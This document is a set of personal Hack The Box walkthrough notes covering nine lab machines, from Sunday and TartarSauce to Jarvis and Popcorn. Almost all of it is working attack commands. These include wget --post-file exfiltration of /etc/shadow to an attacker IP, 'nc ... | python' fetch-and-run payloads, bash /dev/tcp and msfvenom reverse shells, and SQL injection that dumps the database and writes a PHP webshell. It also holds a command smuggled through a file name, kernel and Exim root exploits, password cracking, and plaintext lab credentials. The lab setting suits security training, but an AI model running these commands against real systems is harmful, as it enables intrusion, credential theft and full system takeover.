ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76 -p 22022
>whoami
	sunny
>uname -a
	SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris
	#its solaris box, and ssh connection are incredibly slow
>bash linpeas.sh | tee linpeas-sunny-sunday.txt
	#since nc, ncat are not installed, transfer file using scp
scp -P 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.10.10.76:/tmp/linpeas-sunny-sunday.txt .
>cd /backup
	#there are shadow backup, crack shadow
>cat /etc/passwd > passwd.asli
unshadow passwd.asli shadow.backup > unshadow.txt
john unshadow.txt --wordlist=/opt/rockyou.txt
	cooldude!   (sammy)
>su sammy
	#user no changed, weird
>ssh sammy@localhost -P 22022
	#failed also
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 sammy@10.10.10.76 -p 22022
>sudo -l
	(root) NOPASSWD: /usr/bin/wget
	##wget privesc, abuse wget
>openssl passwd -1 -salt ignite asdasd
cat passwd.new
	rooot:$1$ignite$1IaGl6TOwISXfWqJiIYyH.:0:0:root:/root:/bin/bash
>sudo wget 10.10.14.29/passwd.new -O /etc/passwd
>sudo wget 10.10.14.29/shadow.new -O /etc/shadow
>su rooot
	#failed, it might be different with other UNIX machine
	#just change root to have same hash as sunny and we can su to root
	#read file
>sudo wget --post-file=/etc/shadow 10.10.14.29
>sudo wget --post-file=/root/root.txt 10.10.14.29
nc -lvp 80
	#got root.txt, but I want shell, after googling I found there are two ways
	#1. edit sudoers and cron
>sudo wget --post-file=/etc/sudoers 10.10.14.29
>sudo wget 10.10.14.29/sudoers.new -O /etc/sudoers
>sudo -l
    (root) NOPASSWD: /bin/sh
>sudo /bin/sh
#whoami
	root
	#ovewrite existing root SUID binary, our new file will have same permission as old file
>find / -perm -4000 2>/dev/null
>ls -lah /usr/bin/rmformat
	-r-sr-xr-x 1 root bin 68K 2009-05-14 21:22 /usr/bin/rmformat
	#create python reverse shell -O rmformat or msfvenom
msfvenom -l payload | grep -i solaris
msfvenom -p solaris/x86/shell_reverse_tcp LHOST=10.10.14.29 LPORT=4242 -f elf -o rmformat.new
>sudo wget 10.10.14.29/rmformat.new -O /usr/bin/rmformat
>rmformat
#whoami
	root






TartarSauce Hackthebox
=======================================
sudo autorecon 10.10.10.88
http://10.10.10.88/robots.txt
	Disallow: /webservices/monstra-3.0.4/
http://10.10.10.88/webservices/monstra-3.0.4/admin/
	#allow login as admin:admin
searchsploit monstra
	#there are some exploit RCE, but when try to upload file I got fail
	#spend a days try to make it work but got nothing
	#got notes on forum about methodology when there are opensource application on github, check on issue
dirb http://10.10.10.88/webservices/
http://10.10.10.88/webservices/wp/
http://tartarsauce.htb/webservices/wp/
wpscan --url http://tartarsauce.htb/webservices/wp/ -e u,ap,at,cb
	#got user wpadmin, no plugins and using default template
wpscan --url http://tartarsauce.htb/webservices/wp/ -U wpadmin -P /opt/rockyou.txt
	#try to bruteforce it, but there is something blocking for bruteforcing password
	#spen a days again try to working with bruteforce, cewl on tartar sauce website to bruteforce wpscan and gobuster
cewl -w asd.txt -d 10 -m 3 --with-numbers https://www.tastymediterraneo.com/lebanese-tarator-tahini-based-sauce/
wpscan --url http://tartarsauce.htb/webservices/wp/ -U wpadmin -P asd.txt
dirb http://tartarsauce.htb/webservices/ asd.txt -X php,.pcap,.txt,.html
	#got nothing so sad
	#after reading writeup, I found people running wpscan with aggressive mode
wpscan --url http://tartarsauce.htb/webservices/wp/ -e u,ap,at,cb --plugins-detection aggressive
	#and it really make different, now I got list every plugin installed 
searchsploit gwolle
	#exploit RFI gwolle guestbook 1.5.3
nc -lvp 80
	GET /wp-load.php HTTP/1.0
	#LFI php reverse shell
cp rev.php wp-load.php
http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.6/
>whoami
	www-data
>bash linpeas.sh | tee linpeas-www-tartarsauce.htb
>sudo -l
	(onuma) NOPASSWD: /bin/tar
	#tar privesc
>sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
>whoami
	onuma
>bash linpeas.sh | tee linpeas-onuma-tartarsauce.htb
	#got nothing interesting, try to login wordpress maybe there are some note or file on wordpress 
>cat wp-config.txt
	#got database wordpress
>musql -u wpadmin -p
	#hashcat wordpress, crack wordpress password
hashcat -a 0 -m 400 hash.txt /opt/rockyou.txt
	#got nothing, change password wordpress on database and login into wordpress as wpadmin
	#not thing also
	#since pspy cannot run on this box, I use procmon.sh from ippsec
>bash procmon.sh
	/bin/bash /usr/sbin/backuperer
>cat /usr/sbin/backuperer
	# Backup onuma website dev files.
	/usr/bin/sudo -u onuma /bin/tar -zcvf .asdasdasdasd /var/www/html &
	/bin/mkdir /var/tmp/check
	/bin/tar -zxvf .asdasdasdsad -C /var/tmp/check
	# Test the backup integrity
	/usr/bin/diff -r /var/www/html /var/tmp/check/var/www/html
	# if diff error record error message, if no error delete /var/tmp/check
	#we can abuse this since we own user onuma
	#user onuma can change file .asdasdasdasdasd
	#vulnerable on this script is abuse tar -zxvf .asdasdasdsad (we own .asdasdasdasdasd)
	#and abuse diff -r /var/www/html /var/tmp/check/var/www/html (we own /var/tmp/check/vat/www/html
	##abusing tar: when tar extract file as root, the permission on the file will has exact same as extracted file (as long as user exist)
	#copy bash to kali, chown as root and kame it SUID
>nc 10.10.14.16 80 < /bin/bash
chown root:root bash32;chmod 4755 bash32
ls -la var/www/html/bash32
	-rwsr-xr-x 1 root root 1109564 Sep 30 11:14 bash32
tar -zcvf asd var
tar -tvf asd
	-rwsr-xr-x root/root   1109564 2021-09-30 11:14 var/www/html/bash32
	#tar file should in directory var/www/html to make diff error and dont delete /var/tmp/check
	#since I cant run watch (idk why because I think I got full tty shell), I create watch.sh to check file change every second
	#in case bash doesn't exist on box we can compile suid 0 binary
>bash /tmp/jembot/watch.sh /var/tmp/
>cp asd .asdasdasdasdasdasd
	#wait until file extracted to /var/tmp/check
>cd /vat/tmp/check/var/www/html/
>ls -lah
	-rwsr-xr-x 1 root root 1.1M Sep  30 12:04 bash32
>./bash32 -p
>id
	uid=1000(onuma) gid=1000(onuma) euid=0(root) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
>cat /root/root.txt
	##abusing -r (revursive) diff: since we can control diff argument we can create link to /root/root.txt 
	#/usr/bin/diff -r /var/www/html /var/tmp/check/var/www/html 
	#inside recursive diff there are index.html robots.txt
	#tar /var/www/html and create link on robots.txt to /root/root.txt
>mkdir var/www/html
>ln -s /root/root.txt var/www/html/robots.txt
>tar -zcvf asd var/
>bash /tmp/jembot/watch.sh /var/tmp/
>cp asd .asdasdasdasdasdasd
>tail -f /var/backups/onuma_backup_error.txt







Irket hackthebox
============================================
sudo autorecon 10.10.10.117
http://10.10.10.117/
cat tcp_80_http_nikto.txt
cat tcp_80_http_dirb.txt
	#website got nothing
nmap -p- -sV 10.10.10.117
	6697/tcp  open   irc     UnrealIRCd
	#connect irc client
apt-cache search irssi
sudo apt-get install irssi
irssi
>/connect 10.10.10.117 6697 Password1 djmardov
	#got nothing
>/quit
	#exploit irc backdoor
nmap -Pn -n -sV -p6697 --script=irc-unrealircd-backdoor 10.10.10.117 -e tun0
	#vulnerable
wget https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py
	#edit exploit and payload
python3 exploit.py -payload bash 10.10.10.117 6697
>whoami
	ircd
	#check user shell
>cat /etc/passwd | grep -v 'false\|nologin'
>bash linpeas.sh | tee ircd-irket-linpeas.txt
	#linpeas got nothing
find / -user djmardov -ls 2>/dev/null
	/home/djmardov/Documents/.backup
cat /home/djmardov/Documents/.backup
	Super elite steg backup pw
	UPupDOWNdownLRlrBAbaSSss
	#google steg backup found out that steg means steganograpyh
	#break the steganography
binwalk irked.jpg
sudo pip3 install stegcracker
sudo apt-get install steghide -y
echo UPupDOWNdownLRlrBAbaSSss > asd.txt
stegcracker irked.jpg asd.txt
	Your file has been written to: irked.jpg.out
	UPupDOWNdownLRlrBAbaSSss
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
	wrote extracted data to "pass.txt".
cat irked.jpg.out
	Kab6h+m+bbp2J:HG
	#got password djmardov
	#add ssk key
ssh-keygen
cat irket.pub > /home/djmardov/.ssh/authorized_keys
>chmod 600 authorized_keys
ssh -i irket djmardov@10.10.10.117
>whoami
	djmardov
	#I found .mozilla/firefox directory and there are key3.db
	#try to extract master password
>tar -zcvf firefox.tar.gz firefox/
>nc 10.10.14.16 80 < firefox.tar.gz
tar -xzvf firefox.tar.gz
git clone https://github.com/lclevy/firepwd
sudo pip3 install -r requirements.txt
python3 firepwd.py -d ../firefox/84p8ofq6.default
	#got nothing
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
	-rwsr-xr-x 1 root   root       7.2K May 16  2018 /usr/bin/viewuser
	#privesc, well I can privesc to root without need to escalate to djmardov, I just missed the linpeas SUID output 
>/usr/bin/viewuser
	sh: 1: /tmp/listusers: not found
>cd tmp
	#create listusers as reverse shell
>cp rev.sh listusers
>/usr/bin/viewuser
nc -lvp 443
#whoami
	root







Friendzone Hackthebox
==========================================
sudo autorecon 10.10.10.123
cat tcp_443_sslscan.txt
	#got domain friendzone.red
http://10.10.10.123/
	#got domain friendzoneportal.red
cat smbmap-share-permissions.txt
smbclient \\\\10.10.10.123\\general
>get credz.txt
cat credz.txt
	admin:WORKWORKHhallelujah@#
smbmap -H 10.10.10.123 -u admin -p 'WORKWORKHhallelujah@#'
	#got nothing
http://friendzoneportal.red
https://friendzoneportal.red
http://friendzone.red
https://friendzone.red
	#try to gobuster every directory and every domain leads to nothing
	#port 53 open, so enumerate dns
dig axfr friendzoneportal.red @10.10.10.123
	admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
	files.friendzoneportal.red. 604800 IN	A	127.0.0.1
	imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
	vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
dig axfr friendzone.red @10.10.10.123
	administrator1.friendzone.red. 604800 IN A      127.0.0.1
	hr.friendzone.red.      604800  IN      A       127.0.0.1
	uploads.friendzone.red. 604800  IN      A       127.0.0.1
	#git bunch of sub domain
https://administrator1.friendzone.red
	#login as admin:WORKWORKHhallelujah@#
https://administrator1.friendzone.red/dashboard.php
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=timestamp
	#pagename parameter load php file
https://administrator1.friendzone.red/timestamp.php
	#find enother php file got nothing
dirb https://administrator1.friendzone.red/ -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' -X php
	#test LFI, and vulnerable to LFI. I need to write something to server
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=timestamp
	PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=
https://uploads.friendzone.red
	#I can upload file from this domain, but I can't find any fila that I upload
dirb https://uploads.friendzone.red
https://uploads.friendzone.red/files/note
	under development !
	#turned out that is rabbit hole
	#inside smb command there are path directory of SMB
cat smbmap-share-permissions.txt
	Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
	general                                                 READ ONLY       FriendZone Samba Server Files
	Development                                             READ, WRITE     FriendZone Samba Server Files
	#so I assume Development smb will on /etc/Development
	#write to server via smb
smbclient \\\\10.10.10.123\\Development
>put phprev.php
	#trigger LFI to reverse shell
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../../etc/Development/phprev
nc -lvp 443
>whoami
	www-data
>bash linpeas.sh | tee www-friendzone-linpeas.txt
	#linpeas got nothing
>cd /var/www/
>cat mysql_data.conf
	db_user=friend
	db_pass=Agpyu12!0.213$
	#escalate to friend
>su friend
>whoami
	friend
>bash linpeas.sh | tee friend-friendzone-linpeas.txt
	#got nothing also, always check /opt
>cd /opt/server_admin/
>cat reporter.py
	import os
	#script only import os, rabbit hole again or something usefull?
>find / -user friend 2>/dev/null | grep -v 'proc\|cache'
	..snip....
	/usr/lib/python2.7/os.pyc
	...snip...
	#I own python os library? but only this library, what a coincident
	##pyrhon library hijack privesc
	#since idk how to reverse shell since I will change os library, so I create python script to read root.txt file
>cat ex.py
	#!/usr/bin/python
	with open('/root/root.txt','r') as f:
		b = open('/tmp/asd', 'w')
		b.writelines(f.read())
>cp ex.py os.py
>watch ls -laht /tmp/
>cat /tmp/asd
	#got root flag
	#after read write up I learn something more
	##print python path
>python -c 'import sys; print "\n".join(sys.path)'
	##fuzzing directory, since we know we uploads smb to Development directory
ls -d /* > root_dirs
echo "/" >> root_dirs
wfuzz --hl 0 -c -w ./root_dirs -H 'Cookie: FriendZoneAuth=e7749d0f4b4da5d03e6e9196fd1d18f1' 'https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=../../..FUZZ/Development/phprev'
	##find writeable file
>find -type f -writable -ls
	##actually we can reverse shell with os library, just add python reverse shell at the end of script
>cat os.py
	...snip...
	except NameError: # statvfs_result may not exist
    pass
	import socket,subprocess,os,pty;
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
	...snip...
	##unitendeed privesc, exim privsc, exim 4.87 – 4.91, just like DC-8 privesc
>netstat -lntp
	127.0.0.1:25
	#create ssh tunnel
>~C
>-L 25:localhost:25
nmap -p 25 127.0.0.1 -sV --script=vuln,discovery
	25/tcp open  smtp    Exim smtpd 4.90_1
searchsploit exim 4.9
searchsploit -m 46996
		##everytime I tried, I got error '\r':command not found
sed -i 's/\r$//' 46996.sh
>bash 46696.sh -m setuid
>ls -laht /tmp
	-rwsr-xr-x  1 root   friend 119K Oct  3 11:20 pwned
>./pwned -p
#whoami
	root
	##stable exim exploit
	#https://github.com/Diefunction/CVE-2019-10149
wget https://github.com/Diefunction/CVE-2019-10149/raw/master/exploit.py
>python exploit.py --rhost localhost --rport 25 --lhost 10.10.14.16 --lport 80
nc -lvp 80
#whoami
	root







Swagshop Hackthebox
=======================================
sudo autorecon 10.10.10.140
http://swagshop.htb
	#magento CMS
	#start dirbuster got so many directory tree but nothing usefull
searchsploit magento
searchsploit -m 37977
python 37977.py
	#got error junk file, remove junk file
python ex.py http://swagshop.htb/
	DID NOT WORK
	#looking inside exploit point to url /admin/Cms_Wysiwyg/directive/index/
	#but no admin panel, dirbuster got no admin panel
	#looking on github someone update the exploit to index.php/admin/Cms_Wysiwyg/directive/index/
http://swagshop.htb/index.php/admin/Cms_Wysiwyg/directive/index/
	#next time scan cms website look how website url run
dirb http://swagshop.htb/index.php/
http://swagshop.htb/index.php/admin/
	#admin panel login
python ex.py http://swagshop.htb/index.php/
	WORKED
	#login as user pywq:123
http://swagshop.htb/index.php/admin/
	#there are some reference to get rce from admin panel
	#playing around with admin panel look like some feature are disabled
python post_rce_revshell.py http://swagshop.htb/ id
python 37811.py http://swagshop.htb/index.php/admin id
	#got error
	##manual upload php shell to magento ecommerce
	#looking on google we can upload shell by edit catalog
	#catalog > manage product > select product > custom options
	#add new options > input type file > allowed file extention (.php)
http://swagshop.htb/index.php/
http://swagshop.htb/index.php/5-x-hack-the-box-sticker.html
	#upload php shell and checkout
	#file stored in http://swagshop.htb/media/custom_options/quote/p/0/(md5sum).php
http://swagshop.htb/media/custom_options/quote/p/0/dce172521b281347a1e0afe7ec4b1aa4.php
	#bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"
>whoami
	www-data
>sudo -l
	(root) NOPASSWD: /usr/bin/vi /var/www/html/*
	#vi privesc, I think its imposible to escalate without got full interactive shell
>sudo /usr/bin/vi /var/www/html/../../../../../../root/root.txt
>sudo /usr/bin/vi /var/www/html/a
	:set shell=/bin/bash
	:shell
#whoami
	root









Networked hackthebox
==========================================
sudo autorecon 10.10.10.146
cat tcp_80_http_nikto.txt
cat tcp_80_http_dirb.txt
http://10.10.10.146
http://10.10.10.146/upload.php
	#try to bypass upload by uploading .php failed
http://10.10.10.146/photos.php
http://10.10.10.146/backup
wget http://10.10.10.146/backup/backup.tar
tar -xf backup.tar
	#backup upload.php photos.php lib.php
	#analyze backup file
cat photos.php
	....
	echo "<img src='uploads/".$value."' width=100px>";
	....
	#there are php echo create html code <img>
	#variavle $value are filename
	#I got XSS by escaping src= and add xss scirpt, so echo script wil be like
	#echo "<img src='uploads/10_10_14_16.asd'onerror=alert(1)><img src=10.10.14.16 width=100px>";
10_10_14_16.asd'onerror=alert(1)><img src=10.10.14.16%00.jpg
	#%00 will escape echo strings
	#try to escaping echo and add phpinfo() but failed
	#try to bypass again failed
	#take me a days to inject extention failed then open up walktrough
	#got dissapointed by result because we only need file.php.jpg
	#web server read file.php.jpg as .php file
	#upload webshell
http://10.10.10.146/uploads/10_10_14_16.php.jpg
	nc 10.10.14.16 80 | python
>whoami
	apache
>cd /home/guly
>cat check_attack.php 
	....
	exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
	....
	#script to remove file inside /var/www/html/uploads/
	#$path=/var/www/html/uploads/ and $value are file inside uploads directory
	#inject $value to reverse shell
>cd /var/www/html/uploads/
>touch "asd&&nc 10.10.14.16 80 | python"
	#so the script will executing like this
	#exec("nohup /bin/rm -f /var/www/html/uploads/asd&&nc 10.10.14.16 80 | python > /dev/null 2>&1 &");
	#after read writeup, people excaping exec with ;
	#touch ';nc 10.10.14.44 4444|python'
nc -lvp 443
>whoami
	guly
>sudo -l
	(root) NOPASSWD: /usr/local/sbin/changename.sh
>cat /usr/local/sbin/changename.sh
	#script create config to /etc/sysconfig/network-scripts/ifcfg-guly
	#input should match with this regex "^[a-zA-Z0-9_\ /-]+$"
cat /etc/sysconfig/network-scripts/ifcfg-guly
	...
	NAME=ps /tmp/foo
	...
	#weird config file, try to execute it and make it same as before
>sudo /usr/local/sbin/changename.sh
	/etc/sysconfig/network-scripts/ifcfg-guly: line 4: /tmp/foo: No such file or directory
	#bash error output??
	#try to add reverse shell to /tmp/foo and re run again
>cp rev.py /tmp/foo
>sudo /usr/local/sbin/changename.sh
nc -lvp 443
#whoami
	root
	#weird privesc
	#after read writeup the vulnerability came from this topic https://seclists.org/fulldisclosure/2019/Apr/24
	#to look at google to find that post use this keyword: "vulnerability ifcf-"










Jarvis Hackthebox
=======================================
	#last time I solve jarvis 2 years ago and ofcourse using someone walktrough
	#no I tried to solve it without sqlmap
sudo autorecon 10.10.10.143
http://10.10.10.143/
http://10.10.10.143/room.php?cod=2'
	#vulnerable to sqli
http://10.10.10.143/room.php?cod=2 OR 1=1
http://10.10.10.143/room.php?cod=2 ORDER BY 7--
	#or sleep(10)--
http://10.10.10.143/room.php?cod=2 or sleep(10)--
GET /room.php?cod=2 and sleep(3)-- HTTP/1.1
GET /room.php?cod=2 and (select sleep(10) from dual where database() like '%')-- HTTP/1.1
	#i tried to exfiltrate data using union select but there is no data printed
	#so I think this is blind sqli
	#I create script to bruteforce time base blind sqli base on this website
	#https://musyokaian.medium.com/time-based-sql-injection-hsctf-big-blind-writeup-f3a320d63ea8
cat brute.py
	payload = f"2 and (select sleep(5) from dual where database() like '{name}%')--"
python3 brute.py
	hotel
cat brute.py
	payload = f"2 and (select sleep(5) from dual where BINARY version() like '{name}%')--"
python3 brute.py
	10.1.37-MariaDB-0_deb9u1
cat brute.py
	payload = f"2 and (select sleep(5) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%cod%' limit 0,1) like '{name}%')--
	room
cat brute.py
	payload = f"2 and (select sleep(5) from dual where (select table_name from information_schema.columns where table_schema=database() and table_name='room' and column_name like '{name}%' limit 0,1) like '%')--"
	column in hotel table:	mini, desCri, cod, image, name, price, star
	#I can't extract data inside the table, I wanna see other blind sqli script
	#turned out its no time base sqli :(
	#people can extract data using union select and group_concat()
	##sqli
http://supersecurehotel.htb/room.php?cod=1 UNION SELECT 1,2--
	#error
http://supersecurehotel.htb/room.php?cod=1 UNION SELECT 1,2,3,4,5,6,7--
	#true data shown, test visible column by put non existed data
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,2,3,4,5,6,7--
	#now column 5,2,3,4 are printed
	#exfiltrate version,directory,user,database
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,@@version,@@datadir,user(),database(),6,7--
	DBMS:10.1.37-MariaDB-0+deb9u1
	dir:/var/lib/mysql/
	user:DBadmin@localhost
	Database:hotel
	#exfiltrade all database using group_concat()
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,group_concat(schema_name),3,4,5,6,7 from information_schema.schemata--
	hotel,information_schema,mysql,performance_schema
	#hotel are not standard DB
	#extract table inside hotel database
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,group_concat(table_name),2,3,5,6,7 from information_schema.tables WHERE table_schema='hotel'--
	room, result same as my blind sqli
	#extract column inside room table
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns WHERE table_schema='hotel' and table_name='room'--
	cod,name,price,descrip,star,image,mini
	#nothing interesting inside database hotel, extract database mysql
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables WHERE table_schema='mysql'--
	...nt,user,gt...
	#there are table user, extract column from table user on mysql database
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns WHERE table_schema='mysql' and table_name='user'--
	...,User,Password,...
	#extract user and password
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,User,3,4,Password,6,7 from mysql.user--
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,group_concat(User,Password),3,4,5,6,7 from mysql.user--
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,group_concat(Host,":",User,":",Password,":",File_priv),3,4,5,6,7 from mysql.user--
	DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
hashid *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
	[+] MySQL5.x
	[+] MySQL4.1
hashcat -h | grep -i mysql
hashcat -m 300 '2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' /opt/rockyou.txt
	imissyou
http://10.10.10.143/phpmyadmin/
	#write shell pypmyadmin to disk, can be done on sqil or from phpmyadmin
http://supersecurehotel.htb/room.php?cod=999 UNION SELECT 1,'<?php echo system($_REQUEST ["cmd"]); ?>',3,4,5,6,7 INTO OUTFILE '/var/www/html/shell.php'--
	select "<?php system($_GET['c']);?>" into outfile "/var/www/html/asd.php"
	#load /etc/passwd sqli
http://10.10.10.143/room.php?cod=99 union select 1,load_file("/etc/passwd"),3,4,5,6,7--
http://10.10.10.143/phpmyadmin/asd.php
	#rev shell nc 10.10.14.16 80 | python
>whoami
	www-root
>sudo -l
	(pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
>cat /var/www/Admin-Utilities/simpler.py
	...
	forbidden = ['&', ';', '-', '`', '||', '|']
	os.system('ping ' + command)
	...
	#privesc bypass escaping os.system command
	#I tried on my python input hex are works, but not with the script
\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31
os.system("ping \x31\x32\x37\x2e\x30\x2e\x30\x2e\x31")
	#escaping with $(whoami)
>sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
	$(python /tmp/rev.py)
>whoami
	pepper
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
	#systemctl privesc, systemctl suid
>cat asd.service
	[Service]
	Type=oneshot
	ExecStart=/tmp/rev.py
	[Install]
	WantedBy=multi-user.target
>systemctl enable /tmp/asd.service
>systemctl start asd.service
nc -lvp 443
#whoami
	root







Mirai Hackthebox
=========================================
sudo autorecon 10.10.10.48
	#there are two web service pi-hole dahsboard on port 80 and plex media server on port 32400
	#spend a days enumerating web service and try working exploit but failed
	#looking up on forum someone said about mirai botnet and default credentials
	#on website there are list user password default credz on iot
	#cut last words as password
cat default-iot.txt| tr ' ' ':' | rev | cut -d ':' -f1 | rev > pass-default-iot.txt
cat default-iot.txt| tr ' ' ':' | cut -d ':' -f1  > user-default-iot.txt
	#bureforce ssh, but then I realize every one user bruteforce on every password list
hydra -L user-default-iot.txt -P pass-default-iot.txt ssh://10.10.10.48
	#change wordlist to format user:pass
cat default-iot.txt | tr ' ' ':' | sed 's/\::/:/g' | sed 's/\::/:/g' | sed 's/\::/:/g'
hydra -C list.txt ssh://10.10.10.48
	#got nothing
	#try to bruteforce web service via burp suite but got nothing also
	#the box defined as easy machine, so I might do wrong, or miss some exploit?
	#open up walktrough and found out using default credentials on rasberry IoT with paswword 'raspberry'
ssh pi@10.10.10.48
>whoami
	pi
>sudo -l
	(ALL : ALL) ALL
>sudo su -
>whoami
	root
>cat /root/root.txt
	I lost my original root.txt! I think I may have a backup on my USB stick...
>cd /media/usbstick/
>ls -la
	-rw-r--r-- 1 root root  129 Aug 14  2017 damnit.txt
>cat damnit.txt
	Damnit! Sorry man I accidentally deleted your files off the USB stick.
	#so root.txt are deleted and need to recover
	#find on google how to recover file
	#read memory where file are mounted
	#find with grep regex
	#regex ..... means find that has 5 character
>grep -a -C 500 -i '...............................' /dev/sda
	#since flag are not all character should using regex [0-9a-z] 32x
	#print [0-9a-z] x 32
>for i in $(seq 1 32); do echo -n '[0-9a-z]'; done
	[0-9a-z][0-9a-z]...[0-9a-z][0-9a-z]
>grep -a -C 50 -i '[0-9a-z]...[0-9a-z]' /dev/sda > tee /tmp/recovery
	#run until memory exhausted, but found nothing
	#looking another directory or file usbstick
>lsof | grep deleted
>find / -name usbstick 2>/dev/null
>cd /media/usbstick
	#then realized should find deleted file in block memory that mounted
>df -ah
	/dev/sdb    .7M   93K  7.9M   2% /media/usbstick
	#lol on /dev/sdb
	#could find flag by grep but it only 8MB, so using strings are enough
>strings /dev/sdb > /tmp/sdb
>cat /tmp/sdb
	#got flag, after read another writeup I learn how to recover file in linux
	##recover file linux
>dcfldd if=/dev/sdb of=/tmp/usb.dd
>tar -czvf /tmp/usb.dd.tar.gz /tmp/usb.dd
>mount
	...
	/dev/sdb on /media/usbstick type ext4
	#usbstick using file system ext4
testdisk usb.dd
Proceed > None > Advanced > ext4 > List





Popcorn Hackthebox
=====================================
sudo autorecon 10.10.10.6
cat tcp_80_http_dirb.txt
http://10.10.10.6/test.php
	#phpinfo
http://10.10.10.6/torrent/users/index.php
http://10.10.10.6/torrent/users/index.php?mode=register
	#register user
http://10.10.10.6/torrent/readme/readme.html
	#Torrent Hoster 2.0
	#default database config file
wget http://10.10.10.6/torrent/database/th_database.sql
cat th_database.sql
	...snip...
	INSERT INTO `users` VALUES (3, 'Admin', '1844156d4166d94387f1a4ad031ca5fa', 'admin', 'admin@yourdomain.com', ...
	#got default credz admin:admin12, but couln't login
searchsploit torrent hoster
	#there are exploit upload torrentfile tamper with .php extention and open file on
	#http://10.10.10.6/torrent/torrents/ but I tried and go nothing, try to guess file name from sha1 hash but got nothing also
http://10.10.10.6/torrent/torrents.php?mode=upload
http://10.10.10.6/torrent/index.php?mode=directory
	#upload file and edit torrent file, there are option to change screenshot fo file, upload file intercept with burp to be .php file
	#<?php system($_GET['c']);?>
http://10.10.10.6/torrent/upload/
http://10.10.10.6/torrent/upload/b88da2caac6648e6c7d7687e3f89085f7e230e6b.php?c=id
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
http://10.10.10.6/torrent/upload/b88da2caac6648e6c7d7687e3f89085f7e230e6b.php?c=nc 10.10.14.16 80 | python
nc -lvp 443
>whomai
	www-data
>cat /var/www/torrent/config.php
	CFG->dbName = "torrenthoster";       //db name
	$CFG->dbUserName = "torrent";    //db username
	$CFG->dbPassword = "SuperSecret!!";   //db password
>mysql -u torrent -p
>use torrenthoster;
>select * from users;
	 Admin    | d5bfedcee289e5e05b86daad8ee3e2e2 | admin     | admin@yourdomain.com
	#got admin hash, but could't crack
>bash linpeas.sh | tee www-popcorn-linpeas.txt
	#linpeas got nothing
	#exploit sudo
>sudo -V
	Sudo version 1.7.0
searcsploit sudo 1.7
searchsploit -m 11651
	#just like Pumpkin garden Box from Vulnhub
	##exploit https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
cat > sudoedit << _EOF
#!/bin/sh
echo ALEX-ALEX
su
/bin/su
/usr/bin/su
_EOF
>chmod a+x ./sudoedit
>sudo ./sudoedit $1
	Password:
	#www-data has password? exploit failed
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
>./linux-exploit-suggester.sh
	[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson
	[+] [CVE-2016-5195] dirtycow
	#kernel exploit linux 2.6.31-14-generic-pae
>uname -r
	2.6.31-14-generic-pae
	Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
	#exploit dirtycow
wget https://www.exploit-db.com/download/40839
>gcc -pthread 40839.c -o dcow -lcrypt
>chmod a+x dcow
>./dcow asd
	You can log in with the username 'firefart' and the password 'asd'.
>su firefart
#id
	uid=0(firefart) gid=0(root) groups=0(root)
	#exploit kernel full-nelson
wget http://vulnfactory.org/exploits/full-nelson.c
>gcc full-nelson.c -o full-nelson
>chmod+x full-nelson
>./full-nelson
	[*] Got root!
#id
	uid=0(root) gid=0(root)
	#after write writeup kernel exploit is not itended path
	#exploit Linux PAM 1.1
	#https://www.exploit-db.com/exploits/14339
>whoami
	www-data
>find /home/george/ -type f
	...
	/home/george/.cache/motd.legal-displayed
	#there are motd.legal-displayed can lead to privesc
	#search on google "motd.legal-displayed privesc"
>dpkg -l | grep pam
